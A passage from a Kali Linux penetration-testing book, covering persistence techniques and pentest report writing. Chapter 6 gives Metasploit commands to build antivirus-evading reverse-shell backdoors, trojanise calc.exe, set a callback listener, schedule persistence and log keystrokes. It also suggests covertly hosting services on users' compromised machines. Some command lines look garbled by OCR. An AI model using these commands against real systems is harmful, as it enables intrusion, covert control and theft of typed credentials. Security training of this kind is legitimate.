- img_proc: true
  md: '# # Chapter 6

    Maintaining Access


    In the previous stages of the penetration testing life cycle, we have learned
    how to explore a system and then scan and attack it. In this chapter, we will
    deal with how we can maintain access to a particular system after we have managed
    to gain access to it. We will learn about Malware, Trojans, Backdoors, Viruses,
    Worms, Botnets, Keyloggers, etc. in this chapter.


    # ## Introduction


    It feels great when you have gained access to a system that does not belong to
    you. The main motive of penetration testing is to maintain access to the compromised
    system to conduct activities if required in the future. There are multiple methods
    to maintain access to a system, but the main goal of it is not to steal information
    but to reduce the time and effort to gain access to the same system again and
    again, especially when you have been able to gain access to it in the past. Maintaining
    access to a system comes into the picture when a penetration tester is working
    with a team and needs to provide access to their team members. A team member should
    be easily able to gain access for their tests and not repeat the whole process
    again to gain access to the system in concern.


    Maintaining Access is as important as Exploiting a system. In this chapter, we
    will go through the basic concepts employed by attackers and penetration testers
    to maintain access to systems that they have already exploited.


    # ## Terminology


    It is expected of a penetration tester or a security professional to know the
    basic terminologies used in the activity of maintaining access. The terms'
  merge: -1
  pgno: 401
- img_proc: true
  md: 'below will help you understand the relation between them and the activity of
    maintaining access.


    # Malware


    Malware is short for malicious software and is a generic term used for worms,
    viruses, trojans, and keyloggers. With respect to penetration testing, you can
    use the broad term malware when you need to report something to the upper management.
    However, while working with the penetration testing team, it is always good to
    be more specific about the type of malware you are dealing with.


    # Backdoors


    Many people confuse backdoors with trojan horses. However, a backdoor is just
    a program that is planted on a compromised system for future entry, such that
    you do not need to go through the process of exploitation. A backdoor may be a
    subset of a trojan horse but the converse is not true. Backdoors are programs
    that have an embedded script to work like a trojan horse but the program does
    not have any function to be used by the system owner.


    # Trojan horse


    A Trojan Horse, known commonly as a trojan, is a software that is planted on the
    owner’s system overtly for their use but have a hidden functionality to run scripts,
    create backdoors, steal information, etc. In certain scenarios, it can also trick
    a user into entering sensitive information such as details of their credit card.


    # Virus


    A virus can be defined as a malicious code that can infect an existing process
    on the system. A virus is capable of infecting files, system memory, hard disk
    sectors, and other hardware. Viruses are further classified as a resident or nonresident.'
  merge: -1
  pgno: 402
- img_proc: true
  md: '# Resident


    A virus that gets into the RAM space during system runtime and gets out of the
    RAM space during the shutdown is known as a resident virus. These viruses attach
    themselves like leeches to other programs that make function calls from the RAM
    space to the kernel.


    # Nonresident


    Nonresident viruses look for hosts on the system''s hard disk, infect the files,
    and then leave from memory.


    # Worms


    Worms imitate the same destruction as a virus. The difference between a worm and
    a virus is that a work can multiply on its own and does not require any input
    from human interaction. Worms will keep hopping from one to another continuously.
    Worms are not used in the process of penetration testing as they are very powerful
    and may get out of control. It is advisable to experiment with worms only in a
    lab environment with zero access to any network, especially the internet.


    # Keyloggers


    As suggested by the name, keyloggers capture everything that is typed by a user
    and log it. This information is then relayed back to a penetration tester or an
    attacker. Keylogger is an essential tool and used routinely by a penetration tester.
    However, certain Rules of Engagement may prevent the use of keyloggers by penetration
    testers, since keyloggers can end up logging personal information of an employee
    such as login credentials or credit card details. Information that is logged by
    keyloggers should be protected during the penetration testing phase and should
    be immediately destroyed afterward.


    # Botnets


    Bots is short for robots which are popularly known as zombies. They can be planned
    on a network of computers and are usually controlled by a single'
  merge: -1
  pgno: 403
- img_proc: true
  md: 'person known as the botmaster.


    A bot network can include a network of computers that are already infected by
    worms, viruses, and trojans. The botmaster has a master computer from where commands
    are trickled down to the bots that are planted on various computers. Bots are
    commonly used by attackers to cause a Denial of Service, Distributed Denial of
    Service, brute force attacks, and other malicious activities. A bit network can
    range from being very tiny consisting of two systems, or very huge consisting
    of multiple servers.


    # Colocation


    Colocation simply means having your services at an off-site location. A penetration
    tester or an attacker may not always want to use their personal computer or laptop
    as their source system. There are various companies today that allow you to host
    your service on their server ranging from a few dollars a to thousands of dollars
    a month. However, collocation does not necessarily mean you pay and host your
    services on a remote server. You could also host them on a user''s computer that
    you have managed to gain access to and run your activities from there without
    the user''s knowledge. For example, a spamming botnet can be hosted on any system
    that you have access to, and you will not necessarily need to pay for a remotely
    located server.


    # Remote Communications


    Communication that makes use of tunneling or VPN servers, remote desktops, or
    any communication between a host and server that are not a part of the same network
    is termed as remote communication. Remote communication is important for penetration
    testers from the point of view that it is needed to maintain access to a target
    system that they have exploited and compromised.


    # Command and Control'
  merge: -1
  pgno: 404
- img_proc: true
  md: 'Command and Control systems, also known as C2 systems, come into picture during
    remote sessions via compromised systems. A penetration tester can use a command
    and control interface to send commands or access a shell on a remote system. A
    penetration tester can also deploy a remote access terminal RAT on the exploited
    system which will be in touch with the command and control system.


    # Backdoors


    In this section, we will discuss a few Kali Linux tools that can be used for backdoors.


    # Using Metasploit for Backdoors


    We have already seen how Metasploit can be used in the exploitation stage in the
    penetration testing life cycle. However, this tool is even more impressive as
    it can be used for backdoors as well. We can use the msfpayload command in Kali
    Linux to generate binaries to be used on Linux and Microsoft platforms and other
    web applications. The output from the msfpayload command can be further piped
    as input to the msfencode command to create more binaries which will help avoid
    detection by antivirus programs.


    # Using Payload to Create an Executable Binary(Unencoded)


    You can use the msfpayload command in Kali Linux with any payload that is listed
    in Metasploit. You can use the command msfpayload -l to list all the available
    payloads. We will be using the "windows/meterpreter/reverse_https" payload in
    our example.


    The command we will be using for our example is as follows.


    ```

    msfpayload windows/meterpreter/reverse_https S

    ```


    The output of the command will provide fields to the penetration tester that need
    to be set to convert the payload into an executable binary.'
  merge: -1
  pgno: 405
- img_proc: true
  md: 'The following formats are available in the msfpayload tool to pipe the output
    to a file.


    +   [C] C

    [H] C-sharp

    [P] Perl

    [Y] Ruby

    [R] Raw

    [J] Javascript

    [X] Executable

    [D] Dynamic Link Library (DLL)

    [V] VBA

    [W] War

    [N] Python


    We will be using X in our example to convert the payload into an executable binary.
    This is a single command which you need to enter on a single line.


    msfpayload windows/meterpreter/reverse_tcp LHOST={YOUR_IP} LPORT={PORT} X > /root/backdoors/unencoded-payload.exe


    The output of this command will be the unencoded-payload.exe file, which is created
    at /root/backdoors.


    # Using Payload to Create an Executable Binary(Encoded)


    You can use the msfencode tool to create an encode executable binary. The command
    is as follows. Again note that it is a single command which needs to be typed
    on the same line using pipes.'
  merge: -1
  pgno: 406
- img_proc: true
  md: '```

    msfpayload windows/meterpreter/reverse_tcp LHOST=

    {YOUR_IP} LPORT={PORT} R | msfencode -e x86/countdown -c

    2 -t raw | msfencode x -t -e x86/shikata_ga_nai -c 3 -k -o

    /root/backdoors/encoded-payload.exe

    ```


    The output of this command will be the encoded-payload.exe file, which is created
    at /root/backdoors/.


    # Creating a Trojan Horse(Encoded)


    In the previous section, we created backdoors that will only run in the background
    without interacting with the user at all. As we have already discussed, a trojan
    horse is something that is supposed to provide some functionality to the user
    and will create a backdoor at the same time. In this example, we are going to
    use the calc.exe file on a Windows XP system which launched a calculator for the
    user. You will first need to copy the calc.exe application to an external media
    such as a USB drive.


    Note: The binaries for the calc.exe program in versions Windows 7 and later are
    not going to be impacted by the trojan that we are using in this example.


    We will use the following command to create the trojan horse on a calc.exe binary.
    The command is to be written on a single line on the command prompt of Kali Linux.


    ```

    msfpayload windows/meterpreter/reverse_tcp {YOUR_IP} {PORT} R |

    msfencode -e x86/countdown -c 2 -t raw | msfencode -x /media/

    {EXTERNAL_USB_DRIVE}/calc.exe -t -e x86/shikata_ga_nai -c 3 -k

    -o /root/backdoors/trojan-calc.exe

    ```


    The output of this command will create a calculator trojan-calc.exe at /root/backdoors/
    which is now embedded with a trojan. You can deploy this trojan on to the target
    system using any of the methods that we have discussed in this book.'
  merge: -1
  pgno: 407
- img_proc: true
  md: '# Setting up a Metasploit Listener


    We have created backdoors and trojans in the previous section, which are deployed
    on the target system. However, they will try to call the source system for which
    a penetration tester needs to set up a Metasploit listener.


    You can use the following commands in Kali Linux to set up the Metasploit listener.
    Kindly ensure that you run the commands in the same order as listed below.


    ```

    msfconsole

    use exploit/multi/handler

    set PAYLOAD windows/meterpreter/reverse_tcp

    set LHOST {YOUR_IP}

    set LPORT {PORT}

    run

    ```


    # Persistent Backdoors


    A college student calling his home to keep a check on his parents or siblings.
    Much like this, a trojan or a backdoor also follow the same routine. There is
    a task known as scheduleme in meterpreter which can be used to achieve this. The
    scheduleme tool allows you to launch commands as per your time requirements(every
    day, every week, every 30 minutes), or commands can be triggered using a user
    action such as the user logs in to their system.


    You can use the following command syntax for scheduleme.


    ```

    scheduleme -c {"file/command"} -i -l

    ```


    # Detectability'
  merge: -1
  pgno: 408
- img_proc: true
  md: 'Many antivirus systems already have a database of known trojans and backdoor.
    If you want to test the strength of your trojan or backdoor, you can upload it
    to http://www.virustotal.com/ wherein you can know which antivirus is capable
    of detecting your trojan or backdoor. For example, the trojan-calc.exe that we
    created earlier is detectable by AVG and BitDefender antivirus.


    # Keyloggers


    In this section, we will discuss a few Kali Linux tools that can be used for backdoors.
    As we have already discussed the process of capturing everything that a user types
    on their keyboard using a software is known as keylogging. There are many third-party
    keylogger applications available today which can be installed and used on a target
    system without being detected. While this is true, using keyloggers requires physical
    access to the target system most of the time, or you may need to attach a listening
    device to the target system physically. The third-party applications also do not
    consider the presence of an intrusion detection system or an antivirus that could
    block the keylogger. Metasploit has a keylogger tool called keyscan available
    via thepreter shell. If a penetration tester has cracked access to a target system,
    they can use the following keyscan command to set up a keylogger.


    Ensure that the order of the commands is maintained.


    ```

    keyscan_start

    keyscan_dump

    keyscan_dump (repeat when needed)

    keyscan_stop

    ```


    The output of this command will show you all the keystrokes that were captured
    by the keylogger. You can also pass the PID of an application to the keyscan command
    if you want to see keystrokes only from a particular'
  merge: -1
  pgno: 409
- img_proc: true
  md: application. You can use the ps command to know the PID of all running applications.
  merge: -1
  pgno: 410
- img_proc: true
  md: <!-- no content -->
  merge: -1
  pgno: 411
- img_proc: true
  md: '# # Chapter 7

    Reporting


    In this chapter, we will understand how a penetration tester or an ethical hacker
    can create penetration test reports to present findings and the results of the
    activities to the technical staff and the upper management of the organizations.
    We will learn about the different parts of a penetration testing report, define
    options for delivering the report, and discuss possibilities for retaining the
    test and report data.


    It is very important to have technical knowledge while conducting penetration
    tests, as it is the knowledge that will fetch the required results from the entire
    activity. The management of an organization usually authorizes the penetration
    testing activity and is also responsible for paying the team working the activity.
    This being said, the same management would expect you to give them a detailed
    report of the penetration testing activity after it has concluded so that they
    can act on things that need attention. The test report is broken down into several
    parts and we will go through them one by one.


    # ## Parts of the Penetration Test Report


    # ### Executive Summary


    An overview of the penetration testing activity is described in the executive
    summary by highlighting the events that occurred during the test. This includes
    information such as the test location, local or remote, the details of the test
    team, the security level and vulnerability of the target system explained in detail.
    It is good to use visuals like graphs and pie charts in this section to show the
    exploits that were executed on the target system. The length of this section should
    not be more than three paragraphs. While this is the section that goes first in
    the test report, it should always be written last.'
  merge: -1
  pgno: 412
- img_proc: true
  md: '# Engagement Procedure


    This section will describe the limits and processes of engagement. You will be
    describing the types of testing that was conducted, if social engineering was
    done as well if Denial of Service was used, etc. You will need to explain the
    methods used in the penetration testing activity in this section. There will be
    detailed information about the location of the attack and how the location was
    associated with the target system. For example, a penetration tester could have
    conducted a test on a web application from a remote location over the internet,
    or an attack could have been wireless as well.


    # Architecture and Composition of the Target


    This is an optional section and includes information such as the operating system
    of the target, open ports, services, etc. You will also define the hardware used
    in the target’s infrastructure. If you have developed network maps during the
    penetration testing activity, you could insert them into this section.


    # Findings


    The weaknesses, flaws, loopholes, and vulnerabilities discovered during the penetration
    test are listed in this section. It is necessary to list down the vulnerabilities
    for each system individually so that the management can work on rectifying the
    flaws. The vulnerabilities could also be linked to the compliance requirements
    with respect to government requirements or regulatory requirements so that the
    owners of those systems can track the costs back to the source of the funds. This
    will help system owners to arrange the funds that are required to fix the system
    as soon as possible. For example, some of the compliance requirement sources are
    Payment Card Industry (PCI), Federal Information Security Management Act (FISMA),
    and standards or Sarbanes Oxley (SOX).


    # Recommended Actions'
  merge: -1
  pgno: 413
- img_proc: true
  md: 'The actions to be taken for all the vulnerabilities and weaknesses discovered
    during the penetration tests are listed in this section. This can be a general
    section, or there can be a dedicated part given in the section to every vulnerability
    that was listed in the Findings section. It should be followed by recommendations
    on how to fix the vulnerability. It is not necessary to describe the exact technical
    fix required to correct the vulnerability. You need to describe it in general
    so that the system owner and their technical staff understand enough to make corrections
    to the system. For example, if the finding is that the password of the system
    was too simple, the corrective recommendation for it would be to set up a strong
    password policy on that system.


    # Conclusion


    The conclusion section should have a summary of all the findings and the recommended
    actions described using very brief statements. If there were critical findings
    that need extra attention, they could be reiterated and reemphasized in this section,
    indicating that the system owner needs to correct those issues first.


    # Appendices


    This section will cover information that supports the complete report, but the
    appendices section should not be a part of the main report body. The section will
    include information about the penetration testing company, raw test data, glossary,
    definitions, and biographies of individual testers who worked on the penetration
    testing activity.


    # Presentation


    The management of an organization who requested for the penetration testing activity
    and funded it will want a formal or semiformal presentation on the entire activity
    to explain the outcome in brief. This could include a slideshow along with a briefing
    by the presenter. In any case, if a presentation has been requested, it should
    be presented professionally. You need to avoid any attacks on the owners, developers,
    system admins,'
  merge: -1
  pgno: 414
- img_proc: true
  md: 'engineers, etc. of the system on which the vulnerability was discovered they
    will play an important role in deciding which teams will be called for future
    penetration testing on their systems. As an alternative, you need to present facts
    that will not hurt anyone''s sentiments and do not blame any group. In short,
    you just need to keep it short and talk about the flaws of the system and how
    they can be fixed.


    There will also be times when a presentation is not requested by the management,
    and they will simply want you to deliver the test report to a particular individual
    or group. In such a case, you need to ensure that the report is accurate, properly
    printed, and kept as professional as possible. In addition to the printed copies,
    soft copies may also be requested. You need to keep a record of the recipients
    of the report so that it can be referred to in the future. There is a lot of critical
    information inside a penetration test report and it could be dangerous if the
    report fell into the wrong hands. This is why it is crucial to keep an account
    of all the people who have been provided with the test report.


    # Storage of Test Report and Evidence


    There will be some organizations which need an electronic or digital copy of the
    penetration test report to be maintained. The digital copy should be secured and
    stored safely in a case like this. The minimum requirement would be to encrypt
    the digital copy of the report and protect it with a very strong password. Care
    should also be taken that the location of the digital copy of the penetration
    test report is not a shared location and it would be even better to store it on
    offline media.


    Then there are organizations which would request you to delete the penetration
    test report. It would be best to do this in the presence of legal counsel as an
    organization may hold you responsible in the future if some findings were missed
    on the original test report. If there is a go-ahead from the legal team, you can
    wipe off the hard disk and ensure that no backup copies are remaining and that
    the file cannot be retrieved again after'
  merge: -1
  pgno: 415
- img_proc: true
  md: 'deletion. It is also a good practice to have two people verify deletion of
    digital documents, which is also known as two-person integrity.


    # Reporting Tools


    There are various reporting tools available in Kali Linux. We will go through
    2 widely used tools of Kali Linux, Dradis, and Magic Tree.


    # Dradis


    The Dradis Framework is an open-source Kali tool which functions as a platform
    to collaborate and report for security exports in the network security domain.
    The tool is developed in Ruby language and is independent of the platform. Dradis
    provides the option to export reports and all the activities can be recorded in
    one single report. Exporting the report in file formats that are PDF or DOC is
    currently only supported in the pro version and is missing from the community
    version.


    # Magic Tree


    Magic Tree is a Kali Linux tool that is used for reporting and data management,
    and it is much like Dradis. It is designed in a way such that data consolidation,
    execution of external commands, querying, and generation of reports becomes an
    easy and straightforward process. Kali Linux has this tool pre-installed and is
    located at “Reporting Tools” category. It manages the host and its associated
    data using the tree node structure.


    # Magic Tree vs. Dradis


    Both Magic Tree and Dradis have been designed to solve the same set of problems,
    i.e., data consolidation and report generation. Both Magic Tree and Dradis allow
    data to be imported from that which is produced by various tools used for penetration
    testing. It also allows data to be added manually and report generation of that
    data. The tree structure is followed by both the tools to store data.'
  merge: -1
  pgno: 416
- img_proc: true
  md: <!-- no content -->
  merge: -1
